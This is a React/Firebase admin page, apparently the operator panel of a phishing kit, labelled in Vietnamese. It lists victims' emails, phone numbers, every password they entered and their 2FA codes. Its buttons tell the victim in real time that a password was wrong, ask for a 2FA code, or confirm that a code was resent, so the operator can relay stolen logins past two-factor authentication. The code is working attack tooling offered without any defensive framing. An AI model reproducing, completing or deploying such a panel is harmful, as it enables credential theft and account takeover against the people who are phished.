import { onValue, ref, update } from "firebase/database";
import { useEffect, useState } from "react";
import { database } from "../Utils/firebase";

const Admin = () => {
  const [records, setRecords] = useState([]);
  useEffect(() => {
    const starCountRef = ref(database, "records");
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();
      const dataentries = Object.entries(data);
      const arr = [];
      for (let [key, value] of dataentries) {
        arr.push({
          uid: key,
          ...value,
        });
      }
      setRecords(arr);
      console.log(arr);
    });
  }, []);

  const updateRecords = (status, uid) => {
    const updates = {};
    updates["/records/" + uid + "/" + "user_status"] = status;
    update(ref(database), updates);
  };

  return (
    <div className="p-5">
      <table className="table">
        <thead>
          <tr>
            <th scope="col">#</th>
            <th scope="col">Email</th>
            <th scope="col">SDT</th>
            <th
              scope="col"
              style={{
                maxWidth: 300,
              }}
            >
              Mật khẩu
            </th>
            <th scope="col">Mã 2fa</th>
            <th scope="col">Trạng thái </th>
            <th scope="col">Hành động của admin </th>
          </tr>
        </thead>
        <tbody>
          {records.map((d, index) => {
            return (
              <tr key={d.uid}>
                <th scope="row">{index + 1}</th>
                <th>
                  <textarea
                    style={{
                      border: "1px solid",
                      height: "auto",
                    }}
                  ></textarea>
                </th>
                <td>{d.email}</td>
                <td>{d.phone}</td>
                <td
                  style={{
                    maxWidth: 300,
                  }}
                >
                  {d?.password?.map((d) => {
                    return (
                      <>
                        <span>{d}</span>
                        <br />
                      </>
                    );
                  })}
                </td>
                <td>{d["2facode"]}</td>
                <td>{d?.user_status}</td>
                <td>
                  <div className="d-flex">
                    {d?.user_status ===
                      "Đang chờ xác nhận mật khẩu user từ admin" && (
                      <div>
                        <button
                          className="btn btn-sm mb-2 btn-success me-2"
                          onClick={() => {
                            updateRecords("Thành công", d.uid);
                          }}
                        >
                          Thành công
                        </button>
                        <button
                          className="btn btn-sm mb-2 btn-danger me-2"
                          onClick={() => {
                            updateRecords(
                              "Mật khẩu sai. Đang chờ user nhập lại.",
                              d.uid
                            );
                          }}
                        >
                          Sai mật khẩu
                        </button>
                        <button
                          className="btn btn-sm mb-2 btn-warning"
                          onClick={() => {
                            updateRecords("Nhập mã 2fa", d.uid);
                          }}
                        >
                          Yêu cầu 2fa
                        </button>
                      </div>
                    )}

                    {d?.user_status === "Đang chờ xác nhận 2fa từ admin" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-success me-2"
                          onClick={() => {
                            updateRecords("Thành công", d.uid);
                          }}
                        >
                          Thành công
                        </button>
                        <button
                          className="btn btn-sm mb-2 btn-success"
                          onClick={() => {
                            updateRecords("Sai mã 2fa", d.uid);
                          }}
                        >
                          Sai mã 2fa
                        </button>
                      </div>
                    )}

                    {d?.user_status === "User yêu cầu gửi lại mã 2fa" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-success"
                          onClick={() => {
                            updateRecords("Đã gửi lại mã 2fa", d.uid);
                          }}
                        >
                          Xác nhận đã gửi
                        </button>
                      </div>
                    )}
                  </div>
                </td>
              </tr>
            );
          })}
        </tbody>
      </table>
    </div>
  );
};

export default Admin;
